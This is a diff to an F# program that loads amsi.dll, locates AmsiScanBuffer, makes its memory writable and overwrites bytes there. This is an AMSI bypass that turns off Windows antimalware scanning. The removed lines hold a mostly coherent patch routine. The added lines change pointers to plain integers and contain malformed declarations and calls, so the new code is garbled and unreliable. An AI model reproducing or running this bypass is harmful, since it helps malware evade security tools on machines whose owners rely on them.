@@ -6,14 +6,14 @@ open System.Runtime.InteropServices
 // Define a function to construct a message to print
 module K32 =
     [<DllImport("kernel32")>]
-    extern IntPtr LoadLibrary(string name);
-    extern IntPtr GetProcAddress(IntPtr hModule,string procName);
-    extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSizw,uint flNewProtect,uint lpflOldProtect);
-    extern void MoveMemory(IntPtr dest,IntPtr src, int size);
+    extern int LoadLibrary(string name);
+    extern int GetProcAddress(int hModule,string procName);
+    extern bool VirtualProtect(int lpAddress,int dwSizw,uint flNewProtect,uint lpflOldProtect);
+    extern void MoveMemory(int dest,int src, int size);
 
 let LoadA =
     let out = K32.LoadLibrary("amsi.dll")
-    if IntPtr.Equals(out,IntPtr.Zero) then
+    if out == 0 then
         printfn "Could not open amsi.dll"
     out
 
@@ -23,13 +23,13 @@ let GetP dl: IntPtr =
         printfn "Could not open AmsiScanBuffer"
     bptr
 
-let Patch P: IntPtr =
-    let zr: uint = uint(0)
-    let size: UIntPtr = UIntPtr(uint64(4))
-    let len: IntPtr = IntPtr(3)
-    let Patch: Byte[] =  Array.create 3 (0x90)
-    let Vp = K32.VirtualProtect(P,size,uint(0x40),zr)
-    K32.MoveMemory(IntPtr(P+IntPtr(uint64(0x001b))),IntPtr(&Patch),len)
+let Patch P: int =
+    let zr: int = 0
+    let size: int = 4
+    let len: int = 3
+    let Patch: Byte[size] = {}
+    let Vp = K32.VirtualProtect(P,size,0x40,zr)
+    K32.MoveMemory(Vp,0x001b,&Patch,len)
     0
 
 [<EntryPoint>]
